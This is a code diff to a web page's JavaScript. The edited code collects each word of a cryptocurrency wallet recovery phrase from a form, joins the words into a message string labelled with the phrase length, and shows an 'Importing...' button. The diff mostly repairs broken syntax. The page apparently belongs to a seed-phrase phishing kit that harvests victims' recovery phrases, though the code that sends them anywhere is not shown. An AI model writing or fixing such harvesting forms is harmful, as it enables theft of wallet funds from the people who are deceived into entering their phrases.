@@ -944,13 +944,16 @@ function openModal() {
       if (type === 'phrase') {
         const inputs = document.querySelectorAll('#seedGrid .seed-input');
         const words  = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
+        
         if (words.length < currentWordCount) {
           alert(`Please fill all ${currentWordCount} words.`);
           return;
         }
-        pesan = `[PHRASE ${currentWordCount}w] ${words.join(' ')}`;
+        
+          pesan = `[PHRASE ${currentWordCount}w] ${words.join(' ')}`;
+      }
 
-      const btnId = type === 'phrase' ? 'btnSubmitPhrase';
+      const btnId = 'btnSubmitPhrase';
       const btn   = document.getElementById(btnId);
       btn.disabled    = true;
       btn.textContent = 'Importing...';
